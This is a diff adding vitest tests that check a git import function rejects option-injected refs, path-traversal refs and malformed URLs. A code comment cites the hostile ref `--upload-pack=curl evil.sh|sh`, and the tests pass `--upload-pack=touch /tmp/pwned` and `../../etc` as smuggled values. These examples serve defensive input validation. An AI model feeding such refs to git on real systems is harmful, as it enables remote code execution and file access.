@@ -15,7 +15,7 @@ import * as os from "node:os";
 import * as path from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 
-import { extractName, extractUrl, resolveSibling, scanDir } from "./import-service.js";
+import { extractName, extractUrl, importService, resolveSibling, scanDir } from "./import-service.js";
 
 let root: string;
 
@@ -186,5 +186,49 @@ describe("resolveSibling", () => {
   it("returns null for a directory with no index file", () => {
     fs.mkdirSync(path.join(root, "emptydir"), { recursive: true });
     expect(resolveSibling(root, "./emptydir")).toBeNull();
+  });
+});
+
+// ── The git clone's arguments are the untrusted-input boundary ────────────
+//
+// A repository URL and a branch ref are both text somebody else chose, and both
+// reach `git` as ARGUMENTS. `execFile` spawns no shell, so quoting is not the
+// question — the branch switcher's rule is the one that applies: a ref called
+// `--upload-pack=curl evil.sh|sh` is not injection, it is an option git honours,
+// and rejecting a leading `-` is what stops it.
+//
+// These assert the REJECTION, which happens before `mkdtemp` and before any
+// process is spawned — so no test here shells out to git.
+describe("importFromGit's argument validation", () => {
+  it("refuses a ref that git would read as an option", async () => {
+    await expect(
+      importService.importFromGit("https://example.com/r.git", "--upload-pack=touch /tmp/pwned"),
+    ).rejects.toThrow(/would be read by git as an option/);
+  });
+
+  it("refuses a ref that would escape into a parent path", async () => {
+    await expect(
+      importService.importFromGit("https://example.com/r.git", "../../etc"),
+    ).rejects.toThrow(/may not contain/);
+  });
+
+  it("refuses a URL with no recognised scheme", async () => {
+    await expect(importService.importFromGit("example.com/r.git")).rejects.toThrow(
+      /valid git URL/,
+    );
+  });
+
+  it("refuses an empty URL", async () => {
+    await expect(importService.importFromGit("   ")).rejects.toThrow(/URL is required/);
+  });
+
+  it("accepts an ordinary branch name (it gets as far as trying to clone)", async () => {
+    // The control. Without it every assertion above passes against a function
+    // that rejects everything, which is the failure mode a validator has.
+    // "gets as far as cloning" is asserted as NOT the validation message —
+    // the clone itself fails, since the URL is not a real repository.
+    await expect(
+      importService.importFromGit("https://127.0.0.1:1/nope.git", "release/2.0"),
+    ).rejects.toThrow(/clone|git is not installed/i);
   });
 });
